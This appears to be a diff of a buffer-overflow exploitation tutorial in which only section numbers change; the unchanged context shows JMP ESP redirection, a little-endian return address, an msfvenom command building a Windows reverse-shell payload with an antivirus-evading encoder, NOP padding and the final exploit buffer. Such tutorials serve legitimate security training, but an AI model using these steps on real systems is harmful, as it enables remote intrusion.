@@ -182,7 +182,7 @@ We can now send this string to the program in place of the shell code. Once the 
 
 We then keep a note of these bad characters, remove them from the string and run it again until all bad characters have been discovered.
 
-### **5. Redirecting Execution**
+### **6. Redirecting Execution**
 
 Once we have discovered all the bad characters the  next step is to tell the program to execute our payload. Replacing our B's with the address of ESP will not work as these address values change every time the program crashes or is reset.
 
@@ -200,7 +200,7 @@ This command searches for JMP commands pointing to ESP. The reason we list the b
 If the green text window with the script output does not appear click Window &gt; log data to view the results We also want to make sure our address has ASLR set to false
 {% endhint %}
 
-### **6.Endianness**
+### **7.Endianness**
 
   
 Once we have discovered an address we would like to use we need to convert it into bytes for our python code to read. we also need to determine the [endianness](https://en.wikipedia.org/wiki/Endianness) of the program. In short if the system uses big endian, the stack gets filled from the top to the bottom and little endian is filled from the bottom towards the top.![](en-cache://tokenKey%3D%22AuthToken%3AUser%3A174687877%22+3f51bb24-85f9-466b-7bd5-a875449bb09d+e2d59912799812fdf800a3d6d5fd3865+https://www.evernote.com/shard/s743/res/6d62508c-ca60-f448-dd25-8e1b25d284a0)
@@ -227,7 +227,7 @@ retrn = "\xAF\x11\x50\x62"
 fuzz = "A" * offset + retrn + "C" * (3000 - 4 - offset)
 ```
 
-### 7. Creating Payload
+### 8. Creating Payload
 
 Once we are sure that our code is working and redirecting execution to our payload. we can then go ahead and create our payload to grant us a reverse shell.  
 kali:
@@ -246,7 +246,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -a x86 --platform wi
 * -e: encoder \(used to bypass antivirus\)
 * -f: format of output \(py = python output\)
 
-### **8. NOPS**
+### **9. NOPS**
 
 Once we have generated our payload we need to add in padding to provide space for our payload to decode itself. We can use [NOP](https://en.wikipedia.org/wiki/NOP_%28code%29) instructions for this which are represented in hex as \x90.
 
@@ -268,7 +268,7 @@ buffer = prefix + " " + fuzz + retrn + padding + buf
 * padding: NOPS to allow payload to decode
 * buf: shellcode for reverse shell
 
-### 9.TROUBLESHOOTING
+### 10.TROUBLESHOOTING
 
 * Check IP address - You may be pointing at your dev machine instead of the target you are trying to exploit
 * Make sure we are using the right payload in msfvenom for the target
